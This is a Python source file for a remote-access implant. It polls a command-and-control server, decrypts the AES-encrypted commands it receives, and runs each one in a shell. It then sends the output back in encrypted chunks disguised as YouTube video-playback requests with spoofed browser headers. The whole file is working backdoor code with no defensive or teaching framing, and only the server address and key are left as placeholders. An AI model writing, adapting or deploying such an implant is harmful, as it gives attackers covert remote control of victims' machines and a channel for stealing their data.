import requests
import time
import random
import subprocess
import socket
import uuid
import base64
import hashlib
from Crypto.Cipher import AES


C2_HOST = "http://ip:port" 

CHUNK_SIZE = 512 
BEACON_DELAY = (3, 5)

AGENT_ID = f"{socket.gethostname()}_{str(uuid.uuid4())[:8]}"

SECRET_PHRASE = b"XXXXXXXXX"
KEY = hashlib.sha256(SECRET_PHRASE).digest()
IV = b"\xXX" * 16

def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return base64.b64encode(cipher.encrypt(plaintext.encode('utf-8'))).decode('utf-8')

def decrypt(ciphertext):
    try:
        cipher = AES.new(KEY, AES.MODE_CFB, IV)
        return cipher.decrypt(base64.b64decode(ciphertext)).decode('utf-8')
    except:
        return ""

def default_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]),
        "Referer": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    }

def fetch_command():
    try:
        url = f"{C2_HOST}/get_command?id={AGENT_ID}"
        r = requests.get(url, headers=default_headers(), timeout=5)
        if r.status_code == 200 and r.text.strip():
            print(f"Enc cmd: {r.text[:20]}...")
            return decrypt(r.text.strip())
    except Exception as e:
        print(f"connec error: {e}")
    return ""

def send_result(result):
    try:
        # mã hóa và gửi chia nhỏ
        encrypted_data = encrypt(result)
        
        # Cắt nhỏ chuỗi mã hóa
        chunks = [encrypted_data[i:i+CHUNK_SIZE] for i in range(0, len(encrypted_data), CHUNK_SIZE)]
        
        print(f"Send result {len(chunks)}")

        for idx, chunk in enumerate(chunks):
            url = (
                f"{C2_HOST}/videoplayback"
                f"?range={idx * CHUNK_SIZE}-{(idx+1)*CHUNK_SIZE}"
                f"&id={AGENT_ID}&data={chunk}"
            )
            requests.get(url, headers=default_headers(), timeout=5)
            time.sleep(0.2) # Delay
            
    except Exception as e:
        print(f"error send: {e}")
      
if __name__ == "__main__":
    print(f"agent {AGENT_ID}")
    print(f"connec at {C2_HOST}")
    
    while True:
        command = fetch_command()
        if command:
            print(f"exec: {command}")
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                output = output.decode('utf-8', errors='replace')
            except subprocess.CalledProcessError as e:
                output = e.output.decode('utf-8', errors='replace')
            except Exception as e:
                output = f"eror {str(e)}"
            
            if not output:
                output = "(Command executed but no output returned)"
                
            send_result(output)
        
        time.sleep(random.uniform(*BEACON_DELAY))
